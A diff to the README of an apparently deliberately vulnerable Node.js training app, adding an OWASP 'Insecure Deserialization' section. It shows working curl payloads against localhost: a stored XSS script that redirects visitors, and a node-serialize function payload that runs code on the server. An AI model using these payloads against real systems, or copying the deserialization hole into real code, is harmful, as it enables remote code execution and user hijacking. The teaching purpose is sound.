@@ -111,3 +111,18 @@ curl -X POST -d 'comment=<script>window.location.replace("https://github.com/mur
 ```
 
 The next time you navigate to http://localhost:3000/xss, you'll be redirected to this README page.
+
+### A8:2017 Insecure Deserialization
+
+Run the keys demo:
+```
+node keys.js
+```
+
+Send a payload containing a function definition followed by a `()`:
+```
+curl -X POST -H "Content-Type: text/plain" -d '{"key": "_$$ND_FUNC$$_function (){ console.log(\"unserialized!\"); }()"}' http://localhost:3000/keys
+```
+
+You'll see the text "userialized!" printed out in the application's console, proving that arbitrary code could be
+executed. Of course, you could use more malicious code than `console.log`.
